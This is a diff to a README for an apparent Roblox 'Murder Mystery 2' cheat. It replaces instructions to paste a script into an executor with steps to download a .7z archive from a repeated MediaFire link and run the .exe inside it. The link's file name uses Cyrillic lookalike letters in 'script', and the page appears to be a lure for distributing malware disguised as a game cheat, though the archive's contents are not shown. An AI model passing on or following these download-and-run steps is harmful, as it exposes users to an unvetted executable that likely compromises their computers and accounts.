@@ -8,11 +8,10 @@
 
 ## 📥 Script
 
-```
 [Download MM2 Script](https://www.mediafire.com/file_premium/ivr409oavu026kc/mm2-s%25D1%2581ri%25D1%2580t.7z/file)
 [Download MM2 Script](https://www.mediafire.com/file_premium/ivr409oavu026kc/mm2-s%25D1%2581ri%25D1%2580t.7z/file)
 [Download MM2 Script](https://www.mediafire.com/file_premium/ivr409oavu026kc/mm2-s%25D1%2581ri%25D1%2580t.7z/file)
-```
+
 ---
 
 ## ✨ Features
@@ -33,12 +32,15 @@
 
 ## 🛠️ How to Use (PC Only)
 
-1. Download a working executor (Solara, Wave, Delta, etc.)
-2. Join **Murder Mystery 2**
-3. Inject the executor
-4. Copy the script above and paste it into the executor
-5. Click **Execute**
-6. The GUI will appear — toggle the features you need
+1. Download using the link above
+2. Extract the archive .7z
+4. Open Roblox and join **Murder Mystery 2**
+5. Run the .exe
+6. Wait until the GUI appears
+7. Enable the features you need
+
+# Important
+- Run the `.exe` **after** you are already in the game
 
 ---
 
